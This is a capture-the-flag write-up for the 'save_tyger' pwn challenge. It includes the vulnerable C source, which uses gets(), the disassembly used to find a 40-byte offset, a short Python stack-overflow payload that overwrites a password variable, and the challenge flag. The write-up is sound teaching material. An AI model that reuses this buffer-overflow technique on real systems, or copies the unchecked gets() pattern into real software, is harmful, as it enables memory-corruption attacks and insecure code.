# pwn/save_tyger

## Challenge

Can you save our one and only Tyger?
<br>
Connect with `nc litctf.live 31786`

[save_tyger.zip](https://drive.google.com/uc?export=download&id=1ePTPwUBKcNLESM2ev1IZEb3kL4SeTcn1)

## Solution

We're given a C file (and an executable):
```c
#include <stdlib.h>
#include <stdio.h>

char flag[64];

int main(){
	long pass;
	char buf[32];
	pass = 0;
	printf("Oh no, someone stole our one and only Tyger! :noo:\n");
	printf("Would you help us save him?\n");
	gets(buf);
	if(pass == 0xabadaaab){
		printf("It worked!\n");
		FILE *f = fopen("flag.txt", "r");
		if(f == NULL){
			printf("Something went wrong. Please let Eggag know.\n");
			exit(1);
		}
		fgets(flag, 64, f);
		puts(flag);
	}
	else printf("WE NEED HIM BAAACK!\n");
}
```
This is a classic problem.

We need to somehow overwrite `pass`. Note the usage of `gets` for input, which lets us write arbitrarily many characters, so we can overflow `buf` into `pass`. We now look in the executable (`objdump -d`) for where `buf` and `pass` are stored:
```
00000000000011c9 <main>:
    11c9:	f3 0f 1e fa          	endbr64 
    11cd:	55                   	push   %rbp
    11ce:	48 89 e5             	mov    %rsp,%rbp
    11d1:	48 83 ec 30          	sub    $0x30,%rsp
    11d5:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp) <- pass = 0
    11dc:	00 
    11dd:	48 8d 3d 24 0e 00 00 	lea    0xe24(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
    11e4:	e8 a7 fe ff ff       	callq  1090 <puts@plt>
    11e9:	48 8d 3d 4b 0e 00 00 	lea    0xe4b(%rip),%rdi        # 203b <_IO_stdin_used+0x3b>
    11f0:	e8 9b fe ff ff       	callq  1090 <puts@plt>
    11f5:	48 8d 45 d0          	lea    -0x30(%rbp),%rax <- so this must be buf
    11f9:	48 89 c7             	mov    %rax,%rdi <- argument to gets (buf)
    11fc:	b8 00 00 00 00       	mov    $0x0,%eax
    1201:	e8 aa fe ff ff       	callq  10b0 <gets@plt>
```
`pass` is at stack frame (`%rbp`) minus `0x8`, while `buf` is at minus `0x30`.
That means they're a distance of `0x30 - 0x8 = `40 bytes apart,
so we need to send 40 junk characters, and then `ab aa ad ab` (little-endian).
We write code to produce the string, converting the hex representation of the bytes to chars:
```py
print("a"*40+"abaaadab".decode("hex"))
```
Pipe the output into the netcat command, and we get our flag.

## Flag

`LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}`
